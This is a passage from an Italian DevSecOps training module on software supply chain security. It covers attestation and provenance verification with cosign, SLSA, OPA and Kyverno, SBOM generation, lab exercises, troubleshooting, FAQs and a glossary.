  --repo myorg/myrepo

# Verificare un'immagine container da GHCR
gh attestation verify oci://ghcr.io/myorg/myapp:v1.0.0 \
  --owner myorg

# Estrarre e ispezionare l'attestazione
gh attestation verify oci://ghcr.io/myorg/myapp:v1.0.0 \
  --owner myorg \
  --format json | jq '.verificationResult.statement.predicate'

# Verifica in CI/CD come gate di deploy
gh attestation verify oci://ghcr.io/myorg/myapp@sha256:abc123... \
  --owner myorg || {
    echo "ERRORE: attestazione non valida, deploy bloccato"
    exit 1
  }
```

### Policy-based provenance verification con OPA

```rego
# provenance_policy.rego — policy OPA per verifica provenance
package provenance

default allow = false

# Consentire solo artefatti con provenance da builder autorizzati
allow {
    input.predicate.runDetails.builder.id == authorized_builders[_]
}

authorized_builders = [
    "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v2.1.0",
    "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.1.0"
]

# Consentire solo build da repository autorizzati
allow {
    startswith(
        input.predicate.buildDefinition.externalParameters.workflow.repository,
        "https://github.com/myorg/"
    )
}

# Rifiutare build trigger manualmente (solo push e tag)
deny[msg] {
    event := input.predicate.buildDefinition.internalParameters.github.event_name
    not event == "push"
    not event == "release"
    msg := sprintf("Build trigger non autorizzato: %s", [event])
}

# Verificare che il build sia avvenuto su GitHub-hosted runner
deny[msg] {
    env := input.predicate.buildDefinition.internalParameters.github.runner_environment
    not env == "github-hosted"
    msg := sprintf("Runner non autorizzato: %s", [env])
}
```

### Verifica della provenance in Kyverno (ImageValidatingPolicy)

```yaml
# Kyverno 1.14+ — ImageValidatingPolicy per verifica provenance
apiVersion: kyverno.io/v2
kind: ImageValidatingPolicy
metadata:
  name: verify-slsa-provenance
spec:
  validationFailureAction: Enforce
  webhookTimeoutSeconds: 30
  evaluation:
    mode: CEL
  matchConstraints:
    resourceRules:
      - apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
        operations: ["CREATE", "UPDATE"]
  matchImageReferences:
    - glob: "ghcr.io/myorg/*"
  imageRules:
    - name: require-slsa-provenance
      attestors:
        - name: slsa-keyless
          entries:
            - keyless:
                identities:
                  - subject: "https://github.com/myorg/*"
                    issuer: "https://token.actions.githubusercontent.com"
      attestations:
        - name: provenance
          type: "https://slsa.dev/provenance/v1"
```

### GUAC — Graph for Understanding Artifact Composition

GUAC (pronunciato "guac") e un progetto OpenSSF che aggrega e correla metadati di supply chain (SBOM, SLSA provenance, attestazioni, vulnerability scan, scorecard) in un grafo interrogabile. Permette di rispondere a domande come:

- "Quali dei miei artefatti in produzione dipendono dal pacchetto X con CVE-2026-YYYY?"
- "Questo artefatto ha provenance SLSA L3 e SBOM allegato?"
- "Quali artefatti sono stati prodotti da un workflow CI/CD specifico?"

```bash
# Ingerire dati in GUAC
# GUAC accetta SBOM (CycloneDX/SPDX), provenance SLSA,
# attestazioni in-toto, e dati OpenSSF Scorecard

guacone collect files --path ./sbom.cdx.json
guacone collect files --path ./provenance.intoto.jsonl

# Query: trovare tutti i pacchetti affetti da una CVE
guacone query vuln --cve CVE-2026-12345

# Query: verificare la catena di fiducia di un artefatto
guacone query known --purl pkg:oci/myapp@sha256:abc123...
```

GUAC e particolarmente utile per organizzazioni con centinaia di microservizi e migliaia di dipendenze. Centralizza le informazioni di supply chain che altrimenti sarebbero distribuite tra registry, CI/CD, scanner e policy engine, rendendo possibile una visione aggregata della postura di sicurezza della supply chain.

### Catena di fiducia completa: dal commit al deploy

```
Commit (firmato con Gitsign)
  → Verifica: gitsign verify --certificate-identity ...
       │
       ▼
Build (SLSA L3 su GitHub Actions)
  → Provenance generata dal reusable workflow
  → Registrata in Rekor
       │
       ▼
Artefatto firmato (cosign keyless)
  → Firma con OIDC ambient credentials
  → Registrata in Rekor
       │
       ▼
SBOM generato e allegato (syft + cosign attest)
  → Vulnerabilita verificate (trivy/grype)
  → VEX per falsi positivi documentato
       │
       ▼
Push a OCI registry
  → Image manifest + referrer (firma, SBOM, provenance, VEX)
       │
       ▼
Verifica pre-deploy
  → slsa-verifier: provenance valida?
  → cosign verify: firma valida?
  → cosign verify-attestation: SBOM presente? Scan pulito?
  → gh attestation verify: attestazione GitHub valida?
       │
       ▼
Admission control (Kyverno/Gatekeeper)
  → ImageValidatingPolicy: firma + provenance + attestazioni
  → Policy OPA: builder autorizzato? Repository autorizzato?
       │
       ▼
Deploy autorizzato
```

---

## Esercizi

### Esercizio 1 — cosign sign + verify (base)

**Obiettivo:** Firmare un'immagine container con cosign keyless e verificare la firma.

```bash
# 1. Creare un Dockerfile minimo
cat > Dockerfile <<'EOF'
FROM alpine:3.20
RUN apk add --no-cache curl
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
EOF

echo '#!/bin/sh' > entrypoint.sh
echo 'echo "Hello from signed image"' >> entrypoint.sh

# 2. Build e push
docker build -t ghcr.io/<your-org>/cosign-lab:v1 .
docker push ghcr.io/<your-org>/cosign-lab:v1

# 3. Ottenere il digest
DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/<your-org>/cosign-lab:v1)

# 4. Firmare (keyless — apre browser per OIDC)
cosign sign --yes "${DIGEST}"

# 5. Verificare
cosign verify \
  --certificate-identity-regexp '.*' \
  --certificate-oidc-issuer 'https://accounts.google.com' \
  "${DIGEST}"
```

### Esercizio 2 — SBOM generation e analisi

**Obiettivo:** Generare SBOM da container image, analizzare vulnerabilità, allegare all'immagine.

```bash
# 1. Generare SBOM con syft
syft packages ghcr.io/<your-org>/cosign-lab:v1 \
  -o cyclonedx-json > sbom.cdx.json

# 2. Analizzare vulnerabilità da SBOM con grype
grype sbom:./sbom.cdx.json -o table

# 3. Allegare SBOM come attestazione
cosign attest --yes \
  --predicate sbom.cdx.json \
  --type cyclonedx \
  "${DIGEST}"

# 4. Verificare attestazione
cosign verify-attestation \
  --type cyclonedx \
  --certificate-identity-regexp '.*' \
  --certificate-oidc-issuer 'https://accounts.google.com' \
  "${DIGEST}"
```

### Esercizio 3 — SLSA Level 2 pipeline (stretch)

**Obiettivo:** Implementare una pipeline GitHub Actions con provenance SLSA Level 2.

Creare `.github/workflows/slsa-release.yml` con il SLSA GitHub Generator, generare provenance firmata, e verificarla con `slsa-verifier`.

### Esercizio 4 — Policy engine admission control

**Obiettivo:** Configurare Kyverno per bloccare immagini non firmate in un cluster di test.

```bash
# 1. Installare Kyverno
helm repo add kyverno https://kyverno.github.io/kyverno/
helm install kyverno kyverno/kyverno -n kyverno --create-namespace

# 2. Applicare policy di verifica firma
kubectl apply -f verify-image-policy.yaml

# 3. Testare con immagine NON firmata (deve fallire)
kubectl run test-unsigned --image=nginx:latest -n production

# 4. Testare con immagine firmata (deve passare)
kubectl run test-signed --image=ghcr.io/<your-org>/cosign-lab:v1 -n production
```

---

## Troubleshooting — 20 problemi comuni

### Problema 1: cosign sign fallisce con "no identity token"

**Sintomo:** `error: getting identity token: no identity token found`

**Causa:** In CI, il job non ha il permesso `id-token: write` o il provider OIDC non è configurato.

**Soluzione:**
```yaml
permissions:
  id-token: write
  packages: write
```

### Problema 2: Verifica fallisce con "no matching signatures"

**Sintomo:** `Error: no matching signatures` durante `cosign verify`.

**Causa:** L'identità o l'OIDC issuer specificati non corrispondono a quelli usati per firmare.

**Soluzione:**
```bash
# Controllare i dettagli della firma
cosign verify --output json \
  --certificate-identity-regexp '.*' \
  --certificate-oidc-issuer-regexp '.*' \
  IMAGE | jq '.[0].optional'

# Usare i valori corretti per identity e issuer
```

### Problema 3: SBOM vuoto o incompleto

**Sintomo:** syft genera un SBOM con pochi o nessun componente.

**Causa:** L'immagine usa un build multi-stage e il layer finale non contiene i package manager metadata.

**Soluzione:**
```bash
# Verificare i cataloger disponibili
syft packages IMAGE -o json | jq '.source'

# Usare l'immagine completa (non scratch/distroless) per SBOM
# oppure generare SBOM dal Dockerfile / lock files
syft dir:./project -o cyclonedx-json > sbom.cdx.json
```

### Problema 4: Rekor timeout o unreachable

**Sintomo:** `error: uploading to tlog` oppure timeout durante la firma.

**Causa:** Rekor pubblico temporaneamente non disponibile, oppure rete aziendale blocca l'accesso.

**Soluzione:**
```bash
# Verificare raggiungibilità
curl -s https://rekor.sigstore.dev/api/v1/log | jq .

# Usare Rekor privato
cosign sign --rekor-url https://rekor.internal.example.com \
  --yes IMAGE

# Firmare senza tlog (sconsigliato, perde non-repudiation)
cosign sign --tlog-upload=false --yes IMAGE
```

### Problema 5: slsa-verifier fallisce con "expected source not found"

**Sintomo:** `FAILED: expected source 'github.com/org/repo' not found in provenance`

**Causa:** Il `--source-uri` non corrisponde esattamente al repository nella provenance.

**Soluzione:**
```bash
# Ispezionare la provenance
cosign verify-attestation --type slsaprovenance \
  --certificate-identity-regexp '.*' \
  --certificate-oidc-issuer-regexp '.*' \
  IMAGE | jq -r '.payload' | base64 -d | jq '.predicate.buildDefinition.externalParameters'

# Usare il source URI esatto dalla provenance
```

### Problema 6: Gatekeeper blocca tutti i pod

**Sintomo:** Tutti i pod vengono rifiutati dall'admission controller, anche quelli legittimi.

**Causa:** La policy è troppo restrittiva o il webhook non riesce a verificare le firme.

**Soluzione:**
```yaml
# Escludere namespace di sistema
spec:
  match:
    excludedNamespaces:
      - kube-system
      - kyverno
      - gatekeeper-system
```

### Problema 7: cosign attest fallisce con "predicate too large"

**Sintomo:** Errore durante l'allegazione di SBOM grandi come attestazione.

**Causa:** L'SBOM supera il limite di dimensione del registry per i manifest (tipicamente 4MB).

**Soluzione:**
```bash
# Comprimere l'SBOM prima dell'attestazione
gzip sbom.cdx.json
cosign attest --predicate sbom.cdx.json.gz --type cyclonedx IMAGE

# Oppure usare ORAS per allegare come artefatto separato
oras attach IMAGE --artifact-type application/vnd.cyclonedx+json sbom.cdx.json
```

### Problema 8: Firma cosign non trovata dopo push a registry diverso

**Sintomo:** `cosign verify` fallisce dopo aver copiato l'immagine in un altro registry.

**Causa:** Le firme cosign sono memorizzate come tag legati al digest nel registry originale.

**Soluzione:**
```bash
# Copiare immagine E firme/attestazioni
cosign copy source-registry.io/myapp:v1 dest-registry.io/myapp:v1

# Oppure con crane
crane copy source-registry.io/myapp:v1 dest-registry.io/myapp:v1 --all-tags
```

### Problema 9: grype non trova vulnerabilità note

**Sintomo:** grype riporta zero vulnerabilità su un'immagine che dovrebbe averne.

**Causa:** Database delle vulnerabilità non aggiornato o cataloger non appropriato.

**Soluzione:**
```bash
# Aggiornare il database
grype db update

# Verificare l'età del database
grype db status

# Forzare specifici cataloger
grype IMAGE --add-cpes-if-none
```

### Problema 10: SLSA provenance generation fallisce su self-hosted runner

**Sintomo:** Il SLSA GitHub Generator fallisce su runner self-hosted.

**Causa:** Il generator richiede GitHub-hosted runner per garantire l'isolamento (SLSA L3).

**Soluzione:** Usare GitHub-hosted runner per il job di provenance. Il build può avvenire su self-hosted, ma la generazione di provenance deve usare il reusable workflow su hosted runner.

### Problema 11: Container image non usa digest nel deployment

**Sintomo:** La policy richiede digest ma il deployment usa tag mutabili.

**Soluzione:**
```yaml
# SBAGLIATO
image: myapp:latest

# CORRETTO
image: myapp@sha256:abc123...

# Kyverno può riscrivere tag → digest automaticamente
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: resolve-image-digest
spec:
  rules:
    - name: resolve-tag-to-digest
      match:
        any:
          - resources:
              kinds: [Pod]
      mutate:
        foreach:
          - list: "request.object.spec.containers"
            patchStrategicMerge:
              spec:
                containers:
                  - name: "{{ element.name }}"
                    image: "{{ images.containers.{{element.name}}.registry}}/{{images.containers.{{element.name}}.path}}@{{images.containers.{{element.name}}.digest}}"
```

### Problema 12: Fulcio certificate expired during verification

**Sintomo:** `certificate has expired` durante la verifica.

**Causa:** I certificati Fulcio sono short-lived (~10 min). La verifica dipende dal transparency log.

**Soluzione:** cosign verifica automaticamente tramite Rekor che la firma è stata creata durante la validità del certificato. Assicurarsi che `--insecure-ignore-tlog=false` (default).

### Problema 13: syft non riconosce dipendenze Go

**Sintomo:** SBOM da immagine Go non include dipendenze.

**Causa:** Il binario Go compilato staticamente non include metadata sui moduli se compilato con `CGO_ENABLED=0` e senza `-buildinfo`.

**Soluzione:**
```dockerfile
# Mantenere build info nel binario
RUN CGO_ENABLED=0 go build -o /app -buildvcs=true ./cmd/app
# syft può estrarre moduli da go binary con build info
```

### Problema 14: Kyverno webhook timeout su cluster con molti pod

**Sintomo:** Pod creation lenta, timeout da admission webhook.

**Soluzione:**
```yaml
# Aumentare timeout e configurare failure policy
spec:
  webhookTimeoutSeconds: 30
  failurePolicy: Ignore  # in staging
  # failurePolicy: Fail  # in production
```

### Problema 15: cosign verify fallisce con "certificate SAN doesn't match"

**Sintomo:** Verifica keyless fallisce perché il Subject Alternative Name nel certificato non corrisponde.

**Soluzione:**
```bash
# Ispezionare il certificato nella firma
cosign verify --output json IMAGE 2>/dev/null | \
  jq -r '.[0].optional.Bundle.Payload.body' | \
  base64 -d | jq -r '.spec.signature.publicKey.content' | \
  base64 -d | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
```

### Problema 16: SBOM CycloneDX non passa la validazione schema

**Sintomo:** Upload a Dependency-Track fallisce con errore di validazione schema.

**Soluzione:**
```bash
# Validare SBOM prima dell'upload
cyclonedx validate --input-file sbom.cdx.json --input-format json --input-version 1.6

# Se fallisce, rigenerare con versione schema corretta
syft packages IMAGE -o cyclonedx-json@1.6 > sbom.cdx.json
```

### Problema 17: OCI referrer non visibili nel registry

**Sintomo:** `oras discover` non mostra referrer allegati.

**Causa:** Il registry non supporta OCI Distribution v1.1 o la referrer API.

**Soluzione:** Verificare che il registry supporti la Referrer API. Harbor 2.9+, ghcr.io, e Docker Hub supportano i referrer.

### Problema 18: trivy scan lento in CI

**Sintomo:** Scansione trivy richiede minuti a ogni run.

**Soluzione:**
```yaml
# Caching del database trivy in CI
- name: Cache trivy DB
  uses: actions/cache@v4
  with:
    path: ~/.cache/trivy
    key: trivy-db-${{ github.run_id }}
    restore-keys: trivy-db-

- name: Scan
  run: trivy image --cache-dir ~/.cache/trivy IMAGE
```

### Problema 19: Signature mismatch dopo rebuild

**Sintomo:** La firma non corrisponde dopo un rebuild identico.

**Causa:** Il build non è riproducibile: timestamp, random seed o ordine di file differiscono.

**Soluzione:** Rendere il build riproducibile eliminando fonti di non-determinismo (timestamp, ordering, random). Per Docker, usare `--no-cache` con input identici o investigare le cause di differenza con `diffoscope`.

### Problema 20: Notation e cosign firme non interoperabili

**Sintomo:** Una firma creata con cosign non può essere verificata con Notation e viceversa.

**Causa:** cosign e Notation usano formati di firma diversi (sigstore bundle vs COSE Sign1).

**Soluzione:** Scegliere un sistema e usarlo consistentemente. Se servono entrambi, firmare l'artefatto con entrambi i tool.

---

## FAQ — 20 domande e risposte

### FAQ 1: Perché dovrei usare la firma keyless invece di chiavi tradizionali?

La firma keyless elimina la gestione delle chiavi: nessuna rotazione, nessun rischio di leak, nessun backup da gestire. L'identità del firmatario è attestata dal provider OIDC (Google, GitHub, Microsoft). Il certificato Fulcio ha validità di ~10 minuti, riducendo la finestra di esposizione. Il transparency log Rekor garantisce non-repudiation. Per CI/CD, la firma keyless con OIDC ambient credentials è automatica e non richiede secret.

### FAQ 2: Qual è la differenza tra cosign e Notation (Notary v2)?

cosign è il tool di sigstore, usa keyless signing (OIDC + Fulcio), transparency log (Rekor), ed è orientato all'open source e alla supply chain pubblica. Notation (Notary v2) è il progetto CNCF, richiede certificati (CA aziendale o plugin), usa trust policy locale, ed è orientato all'enterprise e alla supply chain privata. Entrambi memorizzano firme come OCI referrer. La scelta dipende dal modello di trust: pubblico/trasparente → cosign, enterprise/privato → Notation.

### FAQ 3: SLSA Level 2 è sufficiente per la produzione?

SLSA Level 2 è il minimo raccomandato per produzione. Garantisce build hosted e provenance firmata dalla piattaforma. Per workload critici (finanziari, sanitari, governativi), puntare a Level 3 (build isolato, provenance non-falsifiable). Level 4 è aspirazionale per la maggior parte delle organizzazioni e richiede investimento significativo (build hermetici, riproducibilità).

### FAQ 4: CycloneDX o SPDX per l'SBOM?

CycloneDX se il focus è sicurezza: supporta nativamente VEX, vulnerability, services, e ha schema JSON ricco. SPDX se il focus è license compliance o se richiesto da regolamentazione specifica (es. NTIA minimum elements). Entrambi sono standard riconosciuti. Molte organizzazioni generano in entrambi i formati. CycloneDX è generalmente più pratico per DevSecOps.

### FAQ 5: Come gestisco le vulnerabilità nelle dipendenze transitive?

Generare SBOM completo (syft include dipendenze transitive). Analizzare con grype o Dependency-Track. Per vulnerabilità nelle dipendenze transitive: (1) aggiornare la dipendenza diretta che la include, (2) se non disponibile, documentare con VEX come "not_affected" se il codice vulnerabile non è raggiungibile, (3) override della dipendenza transitiva nel lock file se possibile, (4) creare ticket per il maintainer upstream.

### FAQ 6: Kyverno o Gatekeeper per l'admission control?

Kyverno: più semplice (policy in YAML, no Rego), supporto nativo per image verification con cosign, mutation policies. Gatekeeper: più potente e flessibile (Rego), audit mode maturo, dry-run. Per supply chain security, Kyverno è spesso preferito per il supporto nativo di `verifyImages`. Per policy generiche e complesse, Gatekeeper.

### FAQ 7: Come migro da Docker Content Trust (DCT) a cosign?

Periodo di transizione: firmare con entrambi. cosign è superiore per keyless signing, attestazioni, transparency log. DCT (Notary v1) è deprecato. Migrare: (1) installare cosign nelle pipeline, (2) firmare tutte le immagini con cosign, (3) aggiornare le policy di ammissione per verificare cosign, (4) rimuovere DCT dopo il periodo di transizione.

### FAQ 8: Come funziona la firma cosign in ambiente air-gapped?

In ambienti senza accesso a Internet: (1) usare cosign con chiave locale o KMS on-premise, (2) disabilitare il transparency log (`--tlog-upload=false`), (3) distribuire la chiave pubblica o il certificato manualmente, (4) per keyless, deployare Fulcio e Rekor on-premise (sigstore-scaffolding). Si perde la non-repudiation del log pubblico.

### FAQ 9: Quanto costa implementare la supply chain security?

I tool (cosign, syft, grype, trivy) sono open source e gratuiti. I servizi pubblici di sigstore (Fulcio, Rekor) sono gratuiti. Costi: (1) tempo di implementazione CI/CD pipeline (~2-4 settimane per team), (2) storage per SBOM e attestazioni nel registry (trascurabile), (3) compute per scanning in CI (secondi per scan), (4) formazione del team. Il ROI è alto: un singolo incidente di supply chain costa ordini di grandezza di più.

### FAQ 10: Come gestisco la rotazione delle chiavi KMS per cosign?

Con firma keyless: non serve rotazione (certificati ephemeral). Con KMS: (1) creare nuova chiave nel KMS, (2) firmare nuove immagini con la nuova chiave, (3) mantenere la vecchia chiave in stato "decrypt only" per verifica delle firme esistenti, (4) aggiornare le policy di ammissione per accettare entrambe le chiavi durante il periodo di transizione.

### FAQ 11: Cosa succede se Rekor va offline?

La firma resta valida: è memorizzata nel registry come OCI referrer. La verifica offline è possibile se si ha il certificato Fulcio e la Signed Entry Timestamp (SET). Per ambienti critici, deployare un'istanza Rekor privata. Il log pubblico di sigstore ha SLA di alta disponibilità.

### FAQ 12: Come integro la supply chain security con GitOps (Flux/ArgoCD)?

Flux supporta nativamente la verifica cosign: `ImagePolicy` con `verify.provider: cosign`. ArgoCD: usare Kyverno/Gatekeeper come admission controller. Il flusso: Flux/ArgoCD aggiorna il manifest → Kubernetes admission controller verifica la firma → deploy o rejection.

### FAQ 13: Gli SBOM contengono informazioni sensibili?

Potenzialmente sì: nomi di pacchetti interni, versioni specifiche (utili per attaccanti), dipendenze custom. Mitigazione: (1) generare SBOM completo per uso interno, (2) per condivisione esterna, filtrare componenti interni, (3) non includere path di filesystem o variabili d'ambiente, (4) classificare SBOM come "internal" per default.

### FAQ 14: Come gestisco i falsi positivi nei vulnerability scan?

Usare VEX (Vulnerability Exploitability eXchange) per documentare: (1) `not_affected` se il codice vulnerabile non è raggiungibile, (2) `fixed` se mitigato internamente, (3) mantenere un file `.trivyignore` o equivalente con giustificazione per ogni CVE ignorata, (4) rivedere periodicamente le eccezioni.

### FAQ 15: È possibile verificare la supply chain di immagini di terze parti?

Dipende dal vendor: immagini ufficiali di Google (distroless), Chainguard (cgr.dev) e Red Hat (registry.access.redhat.com) sono firmate con cosign. Per immagini non firmate: (1) scansionare con trivy/grype, (2) generare SBOM, (3) ri-firmare internamente dopo il scan, (4) usare registry mirror con scan automatico.

### FAQ 16: Come gestisco SBOM per applicazioni con multi-arch images?

Generare SBOM per ogni architettura separatamente (i pacchetti possono differire). Allegare ogni SBOM al manifest specifico dell'architettura, non all'index manifest. syft gestisce automaticamente: `syft packages IMAGE --platform linux/amd64`.

### FAQ 17: Qual è il rapporto tra SLSA e NIST SSDF?

SLSA e NIST SSDF (Secure Software Development Framework, SP 800-218) sono complementari. SSDF è un framework di pratiche di sviluppo sicuro (più ampio). SLSA si focalizza specificamente su build integrity e provenance. Implementare SLSA aiuta a soddisfare diversi requisiti SSDF, in particolare PO (Protect the Organization), PS (Protect the Software), PW (Produce Well-Secured Software).

### FAQ 18: Come posso testare la mia supply chain security senza produzione?

Usare un cluster Kubernetes locale (kind, minikube) con Kyverno. Firmare immagini con chiave locale (`cosign generate-key-pair`). Testare l'intero flusso: build → sign → push → admission control → verify. Usare `cosign sign --tlog-upload=false` per evitare di inquinare il log pubblico di Rekor.

### FAQ 19: Come gestisco la compliance per supply chain nelle normative EU (CRA)?

Il Cyber Resilience Act (CRA) dell'UE richiede: (1) SBOM per tutti i prodotti con componenti digitali, (2) vulnerability handling process, (3) security updates per il ciclo di vita del prodotto. SLSA + SBOM + vulnerability scanning soddisfano molti requisiti. Documentare il processo e mantenere evidenze di compliance (attestazioni firmate).

### FAQ 20: Qual è la differenza tra sigstore e TUF?

sigstore si occupa di firma e verifica: chi ha firmato, quando, con quale identità. TUF si occupa di distribuzione sicura: assicurare che l'utente riceva la versione corretta e aggiornata. Sono complementari: sigstore usa TUF per distribuire le proprie chiavi pubbliche. Un'organizzazione può usare TUF per distribuire i propri artefatti firmati con cosign.

---

## Letture

- SLSA Specification. https://slsa.dev/spec/v1.0/
- sigstore Documentation. https://docs.sigstore.dev/
- cosign Usage. https://docs.sigstore.dev/cosign/signing/overview/
- CycloneDX Specification. https://cyclonedx.org/specification/overview/
- SPDX Specification. https://spdx.github.io/spdx-spec/
- in-toto Specification. https://in-toto.io/
- TUF Specification. https://theupdateframework.io/
- SLSA GitHub Generator. https://github.com/slsa-framework/slsa-github-generator
- Kyverno Image Verification. https://kyverno.io/docs/writing-policies/verify-images/
- OWASP Dependency-Track. https://dependencytrack.org/
- Notary v2 (Notation). https://notaryproject.dev/
- NIST SSDF SP 800-218. https://csrc.nist.gov/publications/detail/sp/800-218/final
- OpenSSF Scorecard. https://securityscorecards.dev/

---

## Riferimenti Incrociati

| Modulo | Titolo | Relazione |
|---|---|---|
| [07-ci-cd](07-ci-cd.md) | CI/CD | La pipeline CI/CD e' il punto di enforcement per firma immagini, generazione SBOM e attestazioni SLSA |
| [13-sicurezza-piattaforme](13-sicurezza-piattaforme.md) | Sicurezza delle Piattaforme | La supply chain security si integra con vulnerability scanning e hardening infrastrutturale |
| [15-secrets-management](15-secrets-management.md) | Secrets Management | Chiavi di firma cosign e certificati TUF richiedono gestione sicura tramite Vault o KMS |
| [06-docker-avanzato](06-docker-avanzato.md) | Docker Avanzato | Build multi-stage, image signing e registry OCI sono fondamentali per la supply chain |
| [05-kubernetes](05-kubernetes.md) | Kubernetes | Admission controller (Gatekeeper, Kyverno) verificano firme e policy sulle immagini in fase di deploy |
| [14-compliance](14-compliance.md) | Compliance | SBOM e provenance soddisfano requisiti normativi (EO 14028, NIS2, PCI-DSS) sulla trasparenza software |

---

## Glossario

| Termine | Definizione |
|---|---|
| **SLSA** | Supply-chain Levels for Software Artifacts — framework di livelli 1-4 per l'integrità della supply chain. |
| **cosign** | Tool CLI di sigstore per firmare e verificare artefatti software e container image. |
| **SBOM** | Software Bill of Materials — inventario completo dei componenti di un artefatto software. |
| **Provenance** | Metadati sull'origine di un artefatto: chi lo ha costruito, da quale sorgente, con quale processo. |
| **Attestation** | Affermazione firmata crittograficamente riguardo a un artefatto (scan, SBOM, provenance). |
| **Keyless signing** | Firma basata su identità OIDC e certificati short-lived, senza chiavi long-lived. |
| **syft** | Generatore di SBOM di Anchore, supporta molteplici formati e source. |
| **Fulcio** | Certificate Authority di sigstore che emette certificati X.509 short-lived basati su OIDC. |
| **Rekor** | Transparency log immutabile di sigstore basato su Merkle tree. |
| **in-toto** | Framework per proteggere l'integrità dell'intera supply chain tramite layout e link metadata. |
| **CycloneDX** | Standard OWASP per SBOM, focalizzato su security e vulnerability tracking. |
| **SPDX** | Standard della Linux Foundation per SBOM, focalizzato su license compliance. |
| **TUF** | The Update Framework — framework per la distribuzione sicura di aggiornamenti software. |
| **OCI** | Open Container Initiative — specifiche per container image e distribuzione. |
| **ORAS** | OCI Registry As Storage — tool per gestire artefatti generici nei registry OCI. |
| **Notation** | Tool di firma CNCF (ex Notary v2) per artefatti OCI con trust policy locale. |
| **VEX** | Vulnerability Exploitability eXchange — formato per comunicare lo stato di sfruttabilità delle vulnerabilità. |
| **grype** | Scanner di vulnerabilità di Anchore che lavora su SBOM e container image. |
| **Gatekeeper** | Admission controller Kubernetes basato su Open Policy Agent (OPA). |
| **Kyverno** | Policy engine Kubernetes nativo con supporto per verifica firma immagini. |
| **SARIF** | Static Analysis Results Interchange Format — formato standard per risultati di analisi statica. |
| **SRI** | Subresource Integrity — meccanismo per verificare l'integrità di risorse caricate da CDN. |
| **Dependency confusion** | Attacco in cui un pacchetto pubblico con lo stesso nome di uno privato viene installato al suo posto. |
| **Hermetic build** | Build che non accede a risorse esterne non dichiarate, garantendo riproducibilità. |
| **Transparency log** | Registro pubblico immutabile e verificabile di operazioni crittografiche. |
| **OIDC** | OpenID Connect — protocollo di autenticazione usato per la firma keyless. |
